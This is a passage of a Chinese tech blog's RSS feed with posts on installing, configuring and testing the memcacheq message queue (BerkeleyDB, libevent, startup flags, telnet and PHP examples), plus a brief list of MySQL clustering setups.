 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><span style='color:rgb(255, 0, 0);'>ln -s /usr/local/BerkeleyDB.5.3/lib/libdb-5.3.so /usr/lib64/libdb-5.3.so</span><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>本文参考网址:</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>http://www.niutian365.com/blog/article.asp?id=463</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>http://web2.0coder.com/archives/197</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>http://www.cnblogs.com/sunzy/archive/2012/04/13/2446234.html</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>官方网站:</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>http://memcachedb.org/memcacheq/<br></p> 
 <br> 
</div>
 ]]></description>
	<pubDate>Wed, 08 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-205.html</guid>

</item>
<item>
	<title>四种集群方案</title>
	<link>http://onelose.com/post-203.html</link>
	<description><![CDATA[
 <div>
  Mysql clusterIII.5.1 
</div> 
<div>
  &nbsp;Mysql+drbd+heartbeat 
</div> 
<div>
  Mysql+heartbeat+共享存储方案拓扑图 
</div> 
<div>
  Mysql+replicationIII 
</div>
 ]]></description>
	<pubDate>Wed, 08 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-203.html</guid>

</item>
<item>
	<title>sina微博队列memcacheq服务安装与原理</title>
	<link>http://onelose.com/post-210.html</link>
	<description><![CDATA[
 <div> 
 <h3 style='background-color:rgb(246, 246, 246);color:rgb(76, 76, 76);font-family:'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53;font-size:16px;font-style:normal;text-align:left;'><p style='background-color: rgb(246, 246, 246); font-weight: normal;'>memcacheQ是一个单纯的分布式消息队列服务。它的安装依赖于BerkeleyDB 和 libevent，所以要先安装这BerkeleyDB和libevent：</p></h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53;'>一，BerkeleyDB</h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; font-size: 16px;'> 
  <ol style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <li>下载软件包，http://download.oracle.com/berkeley-db/db-5.0.21.tar.gz</li> 
   <li>解压缩后，cd build_unix</li> 
   <li>../dist/configure</li> 
   <li>make</li> 
   <li>sudo make install</li> 
  </ol></h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53;'>二，libevent （需要1.4.x 或更高）</h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; font-size: 16px;'> 
  <ol style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <li>下载软件包：<a href='http://monkey.org/~provos/libevent/' style='color:rgb(12, 108, 189);'>http://monkey.org/~provos/libevent/</a></li> 
   <li>解压缩后configure &amp; make &amp; make install</li> 
  </ol></h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53;'>三，memcacheQ</h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; font-size: 16px;'> 
  <ol style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <li>下载软件包：http://code.google.com/p/memcacheq/downloads/list</li> 
   <li>解压缩，cd进目录</li> 
   <li>./configure –with-bdb=/usr/local/BerkeleyDB.5.0 –with-libevent=/usr/local/lib –enable-threads</li> 
   <li>make</li> 
   <li>sudo make install</li> 
  </ol></h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53;'>四，启动memcacheQ</h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; font-size: 16px;'> 
  <ol style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <li>使用memcacheq -h 的命令来查看命令行选项</li> 
   <li>启动memcacheq：memcacheq -d -r -H /data1/memcacheq -N -R -v -L 1024 -B 1024 &gt; /data1/mq_error.log 2&gt;&amp;1</li> 
  </ol></h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53;'>五，使用</h3> 
 <h3 style='background-color: rgb(246, 246, 246); color: rgb(76, 76, 76); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; font-size: 16px;'><p style='background-color: rgb(246, 246, 246); font-weight: normal;'>使用以上命令启动mq后，（注意上面的-B参数表示messag的body长度不能超过1024 bytes），使用mq时只需要用到两个命令：set和get：</p> 
  <blockquote style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <pre>set &lt;queue name&gt; &lt;flags&gt; 0 &lt;message_len&gt;\r\n<br>&lt;put your message body here&gt;\r\n<br>STORED\r\n</pre> 
  </blockquote> 
  <blockquote style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <pre>get &lt;queue name&gt;\r\n<br>VALUE &lt;queue name&gt; &lt;flags&gt; &lt;message_len&gt;\r\n<br>&lt;your message body will come here&gt;\r\n<br>END\r\n</pre> 
  </blockquote><p style='background-color: rgb(246, 246, 246); font-weight: normal;'>可以看到，和<a href='http://web2.0coder.com/?p=199' target='_blank' style='color:rgb(12, 108, 189);'>memcache协议</a>基本一致，只是把key name换成queue name，而且在set的命令中，忽略了expire_time的参数。毕竟mq的数据存储是存在berkeleyDB中，做了持久化存储，没有内存的过期时间。</p><p style='background-color: rgb(246, 246, 246); font-weight: normal;'>当使用set命令时，就向指定的消息队列中写入了一条新消息，也就是向BerkeleyDB中新insert了一条数据，当使用get命令时，就从 指定队列中取出一条新消息，也就是向BerkeleyDB中delete了一条数据。当使用stats查看一个指定队列时，可以看到这个队列一共接收了多 少消息，其中被取出了多少条。</p><p style='background-color: rgb(246, 246, 246); font-weight: normal;'>示例：</p> 
  <blockquote style='background-color: rgb(246, 246, 246); font-weight: normal;'> 
   <div>
     fengbo@onlinegame-10-121:~$ telnet 127.0.0.1 22202 
   </div> 
   <div>
     Trying 127.0.0.1… 
   </div> 
   <div>
     Connected to 127.0.0.1. 
   </div> 
   <div>
     Escape character is ‘^]’. 
   </div> 
   <div> 
    <span style='color:rgb(51, 153, 102);'>set q4 0 0 5</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 153, 102);'>hello</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 153, 102);'>STORED</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 153, 102);'>set q4 0 0 5</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 153, 102);'>world</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 153, 102);'>STORED</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 102, 255);'>stats queue</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 102, 255);'>STAT q4 2/0</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 102, 255);'>END</span> 
   </div> 
   <div> 
    <span style='color:rgb(255, 102, 0);'>get q4</span> 
   </div> 
   <div> 
    <span style='color:rgb(255, 102, 0);'>VALUE q4 0 5</span> 
   </div> 
   <div> 
    <span style='color:rgb(255, 102, 0);'>hello</span> 
   </div> 
   <div> 
    <span style='color:rgb(255, 102, 0);'>END</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 102, 255);'>stats queue</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 102, 255);'>STAT q4 2/1</span> 
   </div> 
   <div> 
    <span style='color:rgb(51, 102, 255);'>END</span> 
   </div> 
  </blockquote><p style='background-color: rgb(246, 246, 246); font-weight: normal;'>上面执行了两次set的命令，使用stats queue查看时，可以看到q4的队列中共有消息2条，已取出0条；当使用get取出第一条后，再此使用stats queue查看，q4中消息有2条，其中已取出1条。</p></h3> 
</div>
 ]]></description>
	<pubDate>Tue, 07 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-210.html</guid>

</item>
<item>
	<title>解析linux下安装memcacheq(mcq)全过程笔记</title>
	<link>http://onelose.com/post-207.html</link>
	<description><![CDATA[
 <div> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>memcacheQ是一个单纯的分布式消息队列服务。<br><strong>一，MEMCACHEQ的应用背景<br></strong>Web应用中为什<br>么会需要消息队列？主要原因是由于在高并发环境下，由于来不及同步处理，请求往往会发生堵塞，比如说，大量的insert，update之类的请求同时到达mysql，直接导致无数的行锁表锁，甚至最后请求会堆积过多，从而触发too manyconnections错误。通过使用消息队列，我们可以异步处理请求，从而缓解系统的压力。在Web2.0的时代，高并发的情况越来越常见，从而使消息队列有成为居家必备的趋势，相应的也涌现出了很多实现方案，像Twitter以前就使用RabbitMQ实现消息队列服务，现在又转而使用Kestrel来实现消息队列服务，此外还有很多其他的选择，比如说：ActiveMQ，ZeroMQ等。<br><br>上述消息队列的软件中，大多为了实现AMQP，STOMP，XMPP之类的协议，变得极其重量级，但在很多Web应用中的实际情况是：我们只是想找到一个缓解高并发请求的解决方案，不需要杂七杂八的功能，一个轻量级的消息队列实现方式才是我们真正需要的。</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>二，MEMCACHEQ的特性<br></strong>1 简单易用<br>2 处理速度快<br>3 多条队列<br>4 并发性能好<br>5 与memcache的协议兼容。这就意味着只要装了memcache的extension就可以了，不需要额外的插件。</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>三，安装<br></strong>MEMCACHEQ依赖于libevent和BerkleyDB。<br>BerkleyDB用于持久化存储队列的数据。 这样在MEMCACHEQ崩溃或者服务器挂掉的时候，<br>不至于造成数据的丢失。这一点很重要，很重要。<br>它的安装依赖于BerkeleyDB 和 libevent，所以要先安装这BerkeleyDB和libevent：<br>其中libevent如果你安装过memcached就已经安装了，如果不确定，就检查一下吧</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>1. 先检查libevent, libevent-devel是否已经安装：</strong>&nbsp; rpm -qa|grep libevent 输出中必须包含libevent, libevent-deve, 如果缺失，使用以下命令安装：<span>&nbsp;</span><br><font style='color:rgb(255, 0, 0);font-size:14px;'>yum install libevent yum<span>&nbsp;</span><br>install libevent-devel<br></font><strong>注意事项：</strong>libevent, libevent-devel优先使用yum安装源，光盘镜像中的rpm包安装，这样稳定性和兼容性可得到保证，网上流传的使用源码安装libevent的方法会有问题，因为很可能系统已经安装libevent, 再使用源码安装， 必然导致冲突，造成意外问题，所以一定要使用上述命令检查系统是否已经安装相应的库</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>2. 安装BerkleyDB<span>&nbsp;</span><br></strong>1.tar zxvf bdb-5.3.3.tar.gz<br>2.cd db-5.3.3/<br>#需要进入特定操作系统编译环境，更常规软件的编译有些区别<span>&nbsp;</span><br>3.cd build_unix/<br>4. ../dist/configure --prefix=/usr/local/berkeleydb<br>#如果没有指定特殊安装路径，编译完成，需要将Berkeley Db运行库的路径添加到系统配置里面<br>echo '/usr/local/BerkeleyDB.5.3/lib/' &gt;&gt; /etc/ld.so.conf<br>#重载系统Ld运行库<br>ldconfig<span>&nbsp;</span><br>5. make &amp; make install<br>记得改/etc/ld.so.conf文件，添加/usr/local/BerkeleyDB.5.3/lib啊，不然后面的mcq会安装错误。<br>而BerkeleyDB就要去下载了<br><strong><font style='color:rgb(0, 0, 255);font-size:14px;'>点击下载<a href='http://xiazai.jb51.net/201306/yuanma/db-5.3.21_jb51net.rar' style='color:rgb(0, 102, 153);font-size:14px;'>Berkeley DB 5.3.21.rar<br></a></font></strong>下面安装memcacheq，<br>先下载一个<strong><a href='http://xiazai.jb51.net/201306/yuanma/memcacheq-0.2.0_jb51net.rar' style='color:rgb(0, 102, 153);font-size:14px;'>memcacheq-0.2.0.rar</a>&nbsp; &nbsp;&nbsp;</strong><a href='https://code.google.com/p/memcacheq/downloads/detail?name=memcacheq-0.2.0.tar.gz&amp;can=2&amp;q='>https://code.google.com/p/memcacheq/downloads/detail?name=memcacheq-0.2.0.tar.gz&amp;can=2&amp;q=</a><br>解压，进目录<br>./configure –with-bdb=/usr/local/BerkeleyDB.5.1 –with-libevent=/usr/local/lib –enable-threads<span>&nbsp;</span><br>make<br>make install<span>&nbsp;</span><br>关键是红色字体那一步，一定输入正确，不然make不通过，无法安装</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>下面是启动<br></strong>memcacheq -d -r -u root -p21201 -H /data/memcacheq -N -v -L 1024 -B 1024 &gt; /data/mq_error.log 2&gt;&amp;1<br>这里不推荐使用root用户，有些帖子里说不可以，我这里测试是可以的，不过可能会不安全。<br><font style='color:rgb(255, 0, 0);font-size:14px;'>1 下面是启动时候的参数<br></font>使用memcacheq -h 的命令来查看命令行选项<br><font style='color:rgb(255, 0, 0);font-size:14px;'>2 这个是正确的启动memcacheq：memcacheq -d -uroot -r -p11212 -H /home/wwwroot/mcq -N -R -v -L 1024 -B 1024 &gt; /home/wwwlogs/mq_error.log 2 &gt; &amp;1<br></font><font style='color:rgb(255, 0, 0);font-size:14px;'>3 这个不知道为什么就不行/usr/local/memcacheq/bin/memcacheq -d -l 127.0.0.1 -A 8192 -H /data/memcacheq -B 65535 -N -R -u root<br></font>-p &lt;num&gt; TCP监听端口(default: 22201)<br>&nbsp;-U &lt;num&gt; UDP监听端口(default: 0, off)<br>&nbsp;-s &lt;file&gt; unix socket路径(不支持网络)<br>&nbsp;-a &lt;mask&gt; unix socket访问掩码(default 0700)<br>&nbsp;-l &lt;ip_addr&gt; 监听网卡<br>&nbsp;-d 守护进程<br>&nbsp;-r 最大化核心文件限制<br>&nbsp;-u &lt;username&gt; 以用户身份运行(only when run as root)<br>&nbsp;-c &lt;num&gt; 最大并发连接数(default is 1024)<br>&nbsp;-v 详细输出 (print errors/warnings while in event loop)<br>&nbsp;-vv 更详细的输出 (also print client commands/reponses)<br>&nbsp;-i 打印许可证信息<br>&nbsp;-P &lt;file&gt; PID文件<br>&nbsp;-t &lt;num&gt; 线程数(default 4)<br>&nbsp;<strong>--------------------BerkeleyDB Options-------------------------------<br></strong>&nbsp;-m &lt;num&gt; BerkeleyDB内存缓存大小, default is 64MB<br>&nbsp;-A &lt;num&gt; 底层页面大小, default is 4096, (512B ~ 64KB, power-of-two)<br>&nbsp;-H &lt;dir&gt; 数据库家目录, default is '/data1/memcacheq'<br>&nbsp;-L &lt;num&gt; 日志缓冲区大小, default is 32KB<br>&nbsp;-C &lt;num&gt; 多少秒checkpoint一次, 0 for disable, default is 5 minutes<br>&nbsp;-T &lt;num&gt; 多少秒memp_trickle一次, 0 for disable, default is 30 seconds<br>&nbsp;-S &lt;num&gt; 多少秒queue stats dump一次, 0 for disable, default is 30 seconds<br>&nbsp;-e &lt;num&gt; 达到缓存百分之多少需要刷新, default is 60%<br>&nbsp;-E &lt;num&gt; 一个单一的DB文件有多少页, default is 16*1024, 0 for disable<br>&nbsp;-B &lt;num&gt; 指定消息体的长度,单位字节, default is 1024<br>&nbsp;-D &lt;num&gt; 多少毫秒做一次死锁检测(deadlock detecting), 0 for disable, default is 100ms<br>&nbsp;-N 开启DB_TXN_NOSYNC获得巨大的性能改善, default is off<br>&nbsp;-R 自动删除不再需要的日志文件, default is off<br>测试</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>三、测试<br></strong>1.telnet 10.218.31.121 22201<br>2.stats<br>2.stats queue<br>3.set q4&nbsp; 0 0 5<br>4 hello<br>5 get q4<br>6 stats queue<br>7 delete q4<br>如果set的时候补成功not_STORED的话，检查一下你的启动命令吧，参数没设置好，如果你是新手，干翠多看几个帖子，多尝试启动命令，换换参数，就行了</p> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>四，使用<br></strong>使用以上命令启动mq后，（注意上面的-B参数表示messag的body长度不能超过1024 bytes），使用mq时只需要用到两个命令：set和get：<br>set &lt;queue name&gt; &lt;flags&gt; 0 &lt;message_len&gt;\r\n<br>&lt;put your message body here&gt;\r\n<br>STORED\r\n<br>get &lt;queue name&gt;\r\n<br>VALUE &lt;queue name&gt; &lt;flags&gt; &lt;message_len&gt;\r\n<br>&lt;your message body will come here&gt;\r\n<br>END\r\n<br>可以看到，和memcache协议基本一致，只是把key name换成queue name，而且在set的命令中，忽略了expire_time的参数。毕竟mq的数据存储是存在berkeleyDB中，做了持久化存储，没有内存的过期时间。<br>当使用set命令时，就向指定的消息队列中写入了一条新消息，也就是向BerkeleyDB中新insert了一条数据，当使用get命令时，就从 指定队列中取出一条新消息，也就是向BerkeleyDB中delete了一条数据。当使用stats查看一个指定队列时，可以看到这个队列一共接收了多 少消息，其中被取出了多少条。<br>示例：<br></p> 
 <div style='background-color:rgb(242, 246, 251);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
  <span style='font-size:14px;'><a style='color:rgb(51, 51, 51);'><u>复制代码</u></a></span>代码如下: 
 </div> 
 <div style='background-color:rgb(221, 237, 251);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
  <br>fengbo@onlinegame-10-121:~$ telnet 127.0.0.1 22202 
  <br>Trying 127.0.0.1… 
  <br>Connected to 127.0.0.1. 
  <br>Escape character is ‘^]'. 
  <br>set q4 0 0 5 
  <br>hello 
  <br>STORED 
  <br>set q4 0 0 5 
  <br>world 
  <br>STORED 
  <br>stats queue 
  <br>STAT q4 2/0 
  <br>END 
  <br>get q4 
  <br>VALUE q4 0 5 
  <br>hello 
  <br>END 
  <br>stats queue 
  <br>STAT q4 2/1 
  <br>END 
  <br> 
 </div> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <span style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>上面执行了两次set的命令，使用stats queue查看时，可以看到q4的队列中共有消息2条，已取出0条；当使用get取出第一条后，再此使用stats queue查看，q4中消息有2条，其中已取出1条。</span> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <span style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>PHP测试：</span> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <div style='background-color:rgb(242, 246, 251);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
  <span style='font-size:14px;'><a style='color:rgb(51, 51, 51);'><u>复制代码</u></a></span>代码如下: 
 </div> 
 <div style='background-color:rgb(221, 237, 251);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
  <br>session_start(); 
  <br>$memcache_obj = new Memcache; 
  <br>$memcache_obj-&gt;connect(‘127.0.0.1′, 11212) or die (“error”); 
  <br>memcache_set($memcache_obj, ‘k',10, 0, 0); 
  <br>echo “queue”.memcache_get($memcache_obj, ‘k'); 
  <br>memcache_close($memcache_obj); 
  <br> 
 </div> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <strong style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;text-align:left;'>注释：<br></strong> 
 <span style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>这个时候会出现这样的问题</span> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <span style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>memcacheq: error while loading shared libraries: libdb-5.0.so: cannot open shared object file: No such file or directory</span> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <span style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>解决办法：在/usr/lib 下建个 libdb-5.0.so 软链就OK啦</span> 
 <br style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'> 
 <span style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'>ln -s /usr/local/BerkeleyDB.5.0/lib/libdb-5.0.so /usr/lib/</span> 
 <p style='background-color:rgb(247, 252, 255);color:rgb(0, 0, 0);font-family:Tahoma, Helvetica, Arial, 宋体, sans-serif;font-size:14.3999996185303px;font-style:normal;font-weight:normal;text-align:left;'><strong>五，关闭memcacheQ<br></strong>使用ps命令查查memcacheQ的进程:ps -ef|grep wuf,然后直接将进程kill掉.</p> 
 <br> 
</div>
 ]]></description>
	<pubDate>Tue, 07 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-207.html</guid>

</item></channel>
</rss>